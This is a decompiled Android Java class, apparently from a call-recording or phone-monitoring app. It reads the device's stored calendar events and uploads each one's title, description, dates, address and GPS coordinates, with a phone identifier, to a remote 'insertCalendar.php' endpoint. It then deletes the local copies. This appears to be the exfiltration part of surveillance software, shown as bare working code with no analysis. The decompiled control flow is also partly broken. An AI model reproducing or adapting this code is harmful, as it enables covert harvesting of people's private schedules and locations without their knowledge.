package com.yasoka.spcallrecord.recorder.call.a.c.i;

import a.c.b.C0082n;
import a.c.b.C0090w;
import a.c.e.a;
import a.c.e.e;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import com.app.service.UploadDataService;
import com.crashlytics.android.Crashlytics;
import java.util.HashMap;
import java.util.Map;

/* compiled from: SendCalendar */
public class d implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f266b;

    /* renamed from: a reason: collision with root package name */
    private final Context f267a;

    public d(Context context) {
        this.f267a = context;
    }

    private void a() {
        try {
            UploadDataService.b();
            StringBuilder sb = new StringBuilder();
            sb.append("UploadDataService.getmNbTask() : ");
            sb.append(UploadDataService.f1272b);
            sb.toString();
            if (UploadDataService.f1272b <= 0) {
                this.f267a.stopService(new Intent(this.f267a, UploadDataService.class));
            }
        } catch (Throwable th) {
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
        }
    }

    /* JADX WARNING: Exception block dominator not found, dom blocks: [] */
    /* JADX WARNING: Missing exception handler attribute for start block: B:28:0x01d4 */
    /* JADX WARNING: Removed duplicated region for block: B:22:0x01c4 A[Catch:{ Exception -> 0x01cd }] */
    public synchronized void run() {
        try {
            if (f266b) {
                a();
                return;
            }
            f266b = true;
            C0082n nVar = new C0082n(this.f267a);
            nVar.b();
            Cursor c2 = nVar.c();
            if (c2 == null || c2.getCount() <= 0 || !c2.moveToFirst()) {
                if (c2 != null) {
                    c2.close();
                }
                nVar.a();
                f266b = false;
                a();
            }
            do {
                C0090w wVar = new C0090w();
                wVar.a(c2.getInt(0));
                wVar.j(c2.getString(1));
                wVar.f(c2.getString(2));
                wVar.e(c2.getString(3));
                wVar.d(c2.getString(4));
                wVar.h(c2.getString(5));
                wVar.c(c2.getString(6));
                wVar.b(c2.getString(7));
                wVar.i(c2.getString(8));
                wVar.g(c2.getString(9));
                wVar.a(c2.getString(10));
                HashMap hashMap = new HashMap();
                StringBuilder sb = new StringBuilder();
                sb.append("");
                sb.append(e.e(this.f267a));
                hashMap.put("idPhone", sb.toString());
                StringBuilder sb2 = new StringBuilder();
                sb2.append("");
                sb2.append(wVar.k());
                hashMap.put("title", sb2.toString());
                StringBuilder sb3 = new StringBuilder();
                sb3.append("");
                sb3.append(wVar.f());
                hashMap.put("description", sb3.toString());
                StringBuilder sb4 = new StringBuilder();
                sb4.append("");
                sb4.append(wVar.e());
                hashMap.put("dateStart", sb4.toString());
                StringBuilder sb5 = new StringBuilder();
                sb5.append("");
                sb5.append(wVar.d());
                hashMap.put("dateEnd", sb5.toString());
                StringBuilder sb6 = new StringBuilder();
                sb6.append("");
                sb6.append(wVar.i());
                hashMap.put("locationEvent", sb6.toString());
                StringBuilder sb7 = new StringBuilder();
                sb7.append("");
                sb7.append(wVar.c());
                hashMap.put("date", sb7.toString());
                StringBuilder sb8 = new StringBuilder();
                sb8.append("");
                sb8.append(wVar.b());
                hashMap.put("address", sb8.toString());
                StringBuilder sb9 = new StringBuilder();
                sb9.append("");
                sb9.append(wVar.j());
                hashMap.put("longitude", sb9.toString());
                StringBuilder sb10 = new StringBuilder();
                sb10.append("");
                sb10.append(wVar.h());
                hashMap.put("latitude", sb10.toString());
                StringBuilder sb11 = new StringBuilder();
                sb11.append("");
                sb11.append(wVar.a());
                hashMap.put("accuracy", sb11.toString());
                if (a.b("calendar/insertCalendar.php", (Map<String, String>) hashMap)) {
                    nVar.a(wVar.g());
                }
            } while (c2.moveToNext());
            if (c2 != null) {
            }
            nVar.a();
            f266b = false;
            a();
        } catch (Exception e2) {
            e2.getStackTrace();
            Crashlytics.logException(e2);
        }
    }
}
